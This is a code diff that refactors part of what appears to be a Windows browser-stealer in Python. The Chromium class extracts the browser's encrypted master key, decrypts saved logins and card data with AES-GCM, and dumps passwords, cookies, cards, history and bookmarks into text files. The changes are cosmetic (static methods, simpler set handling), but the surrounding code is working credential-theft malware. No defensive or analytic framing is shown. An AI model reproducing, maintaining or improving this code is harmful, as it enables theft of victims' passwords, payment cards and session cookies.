@@ -1,8 +1,8 @@
+from re import compile
 from sqlite3 import connect
 from shutil import copyfile
 from base64 import b64decode
 from json import loads, dump
-from re import compile, findall
 from multiprocessing import Process
 from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
@@ -46,14 +46,16 @@ class Chromium(Process):
         with open(self.state_path, "r", encoding="utf-8") as state:
             return CryptUnprotectData(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
 
-    def _get_datetime(self, date):
+    @staticmethod
+    def _get_datetime(date):
 
         try:
             return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
         except:
             return "Can't decode"
 
-    def _decrypt(self, buff, master_key):
+    @staticmethod
+    def _decrypt(buff, master_key):
 
         try:
             return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
@@ -74,7 +76,7 @@ class Chromium(Process):
         ]
 
         with open(rf"{self.path}\{args[0]} Passwords.txt", "a", encoding="utf-8") as passwords:
-            passwords.write("".join(item for item in list(set(temp))))
+            passwords.write("".join(item for item in set(temp)))
 
     def _write_cookies(self, *args):
 
@@ -124,7 +126,7 @@ class Chromium(Process):
         ]
 
         with open(rf"{self.path}\{args[0]} Cards.txt", "a", encoding="utf-8") as cards:
-            cards.write("".join(item for item in list(set(temp))))
+            cards.write("".join(item for item in set(temp)))
 
     def _write_history(self, *args):
 
@@ -142,7 +144,7 @@ class Chromium(Process):
         ]
 
         with open(rf"{self.path}\{args[0]} History.txt", "a", encoding="utf-8") as history:
-            history.write("".join(item for item in list(set(temp))))
+            history.write("".join(item for item in set(temp)))
 
     def _write_bookmarks(self, *args):
 
@@ -158,7 +160,7 @@ class Chromium(Process):
         ]
 
         with open(rf"{self.path}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
-            bookmarks.write("".join(item for item in list(set(temp))))
+            bookmarks.write("".join(item for item in set(temp)))
 
     def _get_browser_paths(self, profile):
         return (
